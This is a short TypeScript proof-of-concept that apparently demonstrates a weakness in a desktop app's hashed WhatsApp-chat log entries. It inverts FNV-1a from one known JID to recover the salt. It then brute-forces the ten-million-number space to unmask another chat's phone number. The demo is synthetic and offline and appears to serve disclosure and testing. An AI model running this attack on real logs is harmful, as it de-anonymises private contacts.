// Synthetic, offline demonstration against the REAL desktop/src/shared/notifKeyLog.ts.
// All "numbers" are fictional 1-555 numbers. No log file is read.
import { notifKeyForLog } from '../../../desktop/src/shared/notifKeyLog';

const P = 0x01000193, OFFSET = 0x811c9dc5;
// modular inverse of P mod 2^32 (Newton iteration)
let inv = P; for (let i = 0; i < 5; i++) inv = Math.imul(inv, (2 - Math.imul(P, inv)) >>> 0) >>> 0;
const tagHash = (key: string) => parseInt(notifKeyForLog(key).split('|')[3]!.slice(4), 16) >>> 0;
const fwd = (s0: number, t: string) => { let h = s0 >>> 0; for (let i = 0; i < t.length; i++) { h ^= t.charCodeAt(i); h = Math.imul(h, P) >>> 0; } return h; };
const back = (h: number, t: string) => { for (let i = t.length - 1; i >= 0; i--) { h = Math.imul(h, inv) >>> 0; h = (h ^ t.charCodeAt(i)) >>> 0; } return h; };
const jid = (n: number) => `1555${String(n).padStart(7, '0')}@s.whatsapp.net`;
const key = (tag: string) => `0|com.whatsapp|1|${tag}|10123`;

// Victim run: one process, one salt, two chats. The attacker has the log only.
const known = jid(1234567);            // e.g. the attacker's own chat with the victim (known plaintext)
const secret = jid(Math.floor(Math.random() * 10_000_000));
const hKnown = tagHash(key(known)), hSecret = tagHash(key(secret));
console.log('log shows', notifKeyForLog(key(known)), 'and', notifKeyForLog(key(secret)));

// Step 1: run FNV backwards from the known line to recover the seeded start state (= OFFSET ^ SALT).
const t0 = performance.now();
const start = back(hKnown, known);
console.log('recovered salt', ((start ^ OFFSET) >>> 0).toString(16), `in ${(performance.now() - t0).toFixed(3)} ms`);
// Step 2: dictionary over the whole 1-555-xxx-xxxx space (10^7 candidates) with the recovered start.
const t1 = performance.now(); const hits: string[] = [];
for (let n = 0; n < 10_000_000; n++) { const c = jid(n); if (fwd(start, c) === hSecret) hits.push(c); }
console.log(`dictionary 10^7: ${hits.length} hit(s) in ${((performance.now() - t1) / 1000).toFixed(1)} s; correct=${hits.includes(secret)}; hits=${hits.join(',')}`);
// Control: a wrong known-plaintext guess must NOT find the secret except by 32-bit chance.
const wrongStart = back(hKnown, jid(7654321));
let wrong = 0; for (let n = 0; n < 1_000_000; n++) if (fwd(wrongStart, jid(n)) === hSecret) wrong++;
console.log(`control (wrong known tag, 10^6 candidates): ${wrong} hit(s), expected ~${(1e6 / 2 ** 32).toFixed(4)}`);
